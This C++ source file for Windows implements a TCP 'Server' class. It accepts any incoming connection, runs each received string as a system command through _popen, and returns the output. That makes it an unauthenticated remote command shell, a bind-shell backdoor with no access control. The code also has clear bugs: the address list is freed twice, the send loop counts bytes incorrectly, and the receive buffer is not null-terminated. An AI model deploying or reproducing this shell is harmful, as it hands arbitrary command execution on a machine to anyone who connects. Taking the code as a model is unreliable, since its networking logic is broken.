#include <iostream>
#include "Server.h"

#include <string>
#include <vector>

#include <WS2tcpip.h>
#include <winsock.h>
#include <Windows.h>

Server::Server()
{

}

bool Server::Bind(std::string Port)
{
	addrinfo Hints, *ServerInfo;

	memset(&Hints, 0, sizeof(Hints));
	Hints.ai_family=AF_UNSPEC;
	Hints.ai_socktype=SOCK_STREAM;
	Hints.ai_flags=AI_PASSIVE;

	int Rcv;
	if((Rcv=getaddrinfo(NULL, Port.c_str(), &Hints, &ServerInfo))!=0)
	{
		return false;
	}

	char yes=1;
	addrinfo *p;
	for(p=ServerInfo; p!=NULL; p=p->ai_next)
	{
		if((ServerSocket=socket(p->ai_family, p->ai_socktype, p->ai_protocol))==-1)
		{
			continue;
		}

		if(setsockopt(ServerSocket, SOL_SOCKET, SO_REUSEADDR, &yes, sizeof(int))==-1)
		{
			return false;
		}

		if(bind(ServerSocket, p->ai_addr, p->ai_addrlen)==-1)
		{
			closesocket(ServerSocket);
			continue;
		}

		break;
	}

	if(p==NULL)
	{
		return false;
	}

	freeaddrinfo(p);
	freeaddrinfo(ServerInfo);

	return true;
}
void Server::Start()
{
	// Wait for a connection
	while(true)
	{
		sockaddr_storage Storage;
		socklen_t Size=sizeof(Storage);

		ClientSocket=accept(ServerSocket, (sockaddr *)&Storage, &Size);
		if(ClientSocket==-1)
		{
			continue;
		}

		char s[INET6_ADDRSTRLEN];
		inet_ntop(Storage.ss_family, GetInAddr((sockaddr *)&Storage), s, sizeof(s));
		// Got connection

		while(true)
		{
			std::string Received=Receive();
			if(Received=="disconnect")
			{
				closesocket(ClientSocket);
				break;
			}
			else
			{
				Send(RunCommand(Received));
			}
		}
	}
}

bool Server::Send(std::string Message)
{
	std::vector<char> Msg=std::vector<char>(Message.begin(), Message.end());
	int SentTotal=0, Sent=0, Total=Msg.size();

	while(SentTotal!=Total)
	{
		if(Sent += (send(ClientSocket, &Msg[0], Msg.size(), 0))==-1)
		{
			return false;
		}
		Msg.erase(Msg.begin(), Msg.begin()+Sent);
		SentTotal+=Sent;
	}

	return true;
}
std::string Server::Receive()
{
	int Bytes=0;
	char Buffer[MaxReceiveLength];
	std::string Result;

	do
	{
		if((Bytes=recv(ClientSocket, Buffer, MaxReceiveLength, 0))==-1)
		{
			return "";
		}
		Result+=Buffer;
	} while(Bytes>0);

	return Result;
}

void Server::Shutdown()
{
	closesocket(ClientSocket);
}

std::string Server::RunCommand(std::string Input)
{
	FILE *Pipe=_popen(Input.c_str(), "r");
	if(!Pipe)
	{
		return "Error";
	}
	char Buffer[256];
	std::string Result="";
	while(!feof(Pipe))
	{
		if(fgets(Buffer, 256, Pipe)!=NULL)
		{
			Result+=Buffer;
		}
	}
	_pclose(Pipe);
	return Result;
}

void *Server::GetInAddr(sockaddr *sa)
{
	if(sa->sa_family==AF_INET)
	{
		return &(((sockaddr_in *)sa)->sin_addr);
	}
	else
	{
		return &(((sockaddr_in6 *)sa)->sin6_addr);
	}
}